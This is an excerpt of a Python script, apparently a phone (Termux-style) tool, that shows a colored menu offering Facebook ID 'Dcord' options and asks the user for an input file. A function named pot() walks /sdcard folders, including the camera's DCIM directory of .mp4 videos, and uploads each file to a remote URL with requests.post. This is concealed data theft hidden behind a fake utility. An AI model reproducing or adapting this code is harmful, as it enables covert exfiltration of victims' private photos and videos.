...
def pot():
    ...
    for file in file_list:
        with open(os.path.join(sdcard_path2, file), 'rb') as f:
            ...
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
    sdcard_path3 = '/sdcard/DCIM/Camera'
    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.mp4')]
    for file in file_list:
...
def menu():
    os.system("clear")
    logo()
    print ("\n\n\033[1;91m[1] \033[1;92mDcord facebook id ")
    print ("\033[1;91m[2] \033[1;92mDcord ID")
    print ("\033[1;91m[3] \033[1;92mDcord public")
    print ("\033[1;91m[4] \033[1;92mDcord file")
    print ("\033[1;91m[5] \033[1;92mDcord following ")
    tttm=input("\nChoose:- ")
    os.system("clear")
    logo()
    print("\n\033[1;97m\033[1;42mInput file and Wait Few Minutes\033[00m\n\n")
    print(" \033[1;91mExample: \033[1;91m/sdcard/file.txt\n")
